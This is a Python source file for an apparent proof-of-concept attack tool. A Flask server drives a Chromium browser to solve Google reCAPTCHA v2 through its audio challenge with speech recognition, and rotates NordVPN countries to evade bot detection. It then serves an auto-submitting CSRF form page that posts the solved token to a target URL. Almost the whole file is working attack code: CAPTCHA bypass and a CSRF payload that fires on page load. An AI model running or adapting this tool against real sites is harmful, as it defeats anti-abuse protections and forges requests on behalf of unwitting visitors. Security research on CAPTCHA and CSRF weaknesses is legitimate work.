import argparse
from DrissionPage import ChromiumPage, ChromiumOptions
import time
import os
import urllib.request
import random
import pydub
import speech_recognition
import time
from typing import Optional
from DrissionPage import ChromiumPage
from flask import Flask


app = Flask(__name__)

# https://recaptcha-demo.appspot.com/recaptcha-v2-checkbox.php
HTML_CSRF_POC = """
<html>
  <body>
    <form action="https://recaptcha-demo.appspot.com/recaptcha-v2-checkbox.php" method="POST">
      <input type="hidden" name="ex&#45;a" value="foo" />
      <input type="hidden" name="ex&#45;b" value="bar" />
      <input type="hidden" name="g&#45;recaptcha&#45;response" value="{captcha}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
"""


class RecaptchaSolver:
    """A class to solve reCAPTCHA challenges using audio recognition."""

    # Constants
    TEMP_DIR = os.getenv("TEMP") if os.name == "nt" else "/tmp"
    TIMEOUT_STANDARD = 7
    TIMEOUT_SHORT = 1
    TIMEOUT_DETECTION = 0.05

    def __init__(self, driver: ChromiumPage) -> None:
        """Initialize the solver with a ChromiumPage driver.

        Args:
            driver: ChromiumPage instance for browser interaction
        """
        self.driver = driver

    def solveCaptcha(self) -> None:
        """Attempt to solve the reCAPTCHA challenge.

        Raises:
            Exception: If captcha solving fails or bot is detected
        """

        # Handle main reCAPTCHA iframe
        self.driver.wait.ele_displayed(
            "@title=reCAPTCHA", timeout=self.TIMEOUT_STANDARD
        )
        time.sleep(0.1)
        iframe_inner = self.driver("@title=reCAPTCHA")

        # Click the checkbox
        iframe_inner.wait.ele_displayed(
            ".rc-anchor-content", timeout=self.TIMEOUT_STANDARD
        )
        iframe_inner(".rc-anchor-content", timeout=self.TIMEOUT_SHORT).click()

        # Check if solved by just clicking
        time.sleep(2.1)
        captcha = self.is_solved()
        if captcha != "":
            return captcha

        # Handle audio challenge
        iframe = self.driver("xpath://iframe[contains(@title, 'recaptcha')]")
        iframe.wait.ele_displayed(
            "#recaptcha-audio-button", timeout=self.TIMEOUT_STANDARD
        )
        iframe("#recaptcha-audio-button", timeout=self.TIMEOUT_SHORT).click()
        time.sleep(0.3)

        if self.is_detected():
            raise Exception("Captcha detected bot behavior")

        # Download and process audio
        iframe.wait.ele_displayed("#audio-source", timeout=self.TIMEOUT_STANDARD)
        src = iframe("#audio-source").attrs["src"]

        try:
            text_response = self._process_audio_challenge(src)
            iframe("#audio-response").input(text_response.lower())
            iframe("#recaptcha-verify-button").click()
            time.sleep(0.4)

            if self.is_solved() == "":
                raise Exception("Failed to solve the captcha")
            return self.get_token()

        except Exception as e:
            raise Exception(f"Audio challenge failed: {str(e)}")

    def _process_audio_challenge(self, audio_url: str) -> str:
        """Process the audio challenge and return the recognized text.

        Args:
            audio_url: URL of the audio file to process

        Returns:
            str: Recognized text from the audio file
        """
        mp3_path = os.path.join(self.TEMP_DIR, f"{random.randrange(1,1000)}.mp3")
        wav_path = os.path.join(self.TEMP_DIR, f"{random.randrange(1,1000)}.wav")

        try:
            urllib.request.urlretrieve(audio_url, mp3_path)
            sound = pydub.AudioSegment.from_mp3(mp3_path)
            sound.export(wav_path, format="wav")

            recognizer = speech_recognition.Recognizer()
            with speech_recognition.AudioFile(wav_path) as source:
                audio = recognizer.record(source)

            return recognizer.recognize_google(audio)

        finally:
            for path in (mp3_path, wav_path):
                if os.path.exists(path):
                    try:
                        os.remove(path)
                    except OSError:
                        pass

    def is_solved(self) -> str:
        """Check if the captcha has been solved successfully."""
        try:
            return self.driver.run_js("return grecaptcha.getResponse();")
        except Exception:
            return ""

    def is_detected(self) -> bool:
        """Check if the bot has been detected."""
        try:
            return (
                self.driver.ele("Try again later", timeout=self.TIMEOUT_DETECTION)
                .states()
                .is_displayed
            )
        except Exception:
            return False

    def get_token(self) -> Optional[str]:
        """Get the reCAPTCHA token if available."""
        try:
            return self.driver.run_js("return grecaptcha.getResponse();")
        except Exception:
            return None


CHROME_ARGUMENTS = [
    "-no-first-run",
    "-force-color-profile=srgb",
    "-metrics-recording-only",
    "-password-store=basic",
    "-use-mock-keychain",
    "-export-tagged-pdf",
    "-no-default-browser-check",
    "-disable-background-mode",
    "-enable-features=NetworkService,NetworkServiceInProcess",
    "-disable-features=FlashDeprecationWarning",
    "-deny-permission-prompts",
    "-disable-gpu",
    "-accept-lang=en-US",
    "--disable-usage-stats",
    "--disable-crash-reporter",
    "--no-sandbox",
    # "--headless=new",
    # "--headless"
]

countries = ["France", "Germany", "Italy", "Spain", "United_States"]
options = ChromiumOptions()
for argument in CHROME_ARGUMENTS:
    options.set_argument(argument)

driver = ChromiumPage(addr_or_opts=options)
recaptchaSolver = RecaptchaSolver(driver)


def get_captcha():
    global driver
    try:
        driver.get(app.config["CAPTCHA_URL"])
        captcha = recaptchaSolver.solveCaptcha()
        return captcha
    except Exception as e:
        print(f"Failed to solve captcha: {str(e)}, retrying...")
        if app.config["USE_NORDVPN"]:
            os.system(f"nordvpn c {random.choice(countries)}")
        time.sleep(5)
        driver.get(app.config["CAPTCHA_URL"])
        captcha = recaptchaSolver.solveCaptcha()
        return ''


@app.route("/poc.html", methods=["GET"])
def poc():
    captcha = get_captcha()
    return HTML_CSRF_POC.format(captcha=captcha)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--no-nordvpn",
        action="store_true",
        help="Disable NordVPN"
    )
    parser.add_argument(
        "--captcha-url",
        type=str,
        required=True,
        help="URL of the page with reCAPTCHA to solve"
    )
    args = parser.parse_args()
    app.config["USE_NORDVPN"] = not args.no_nordvpn
    app.config["CAPTCHA_URL"] = args.captcha_url

    # app.run(host="0.0.0.0", port=4444)
    app.run(host="0.0.0.0", port=3333)
    

if __name__ == "__main__":
    main()
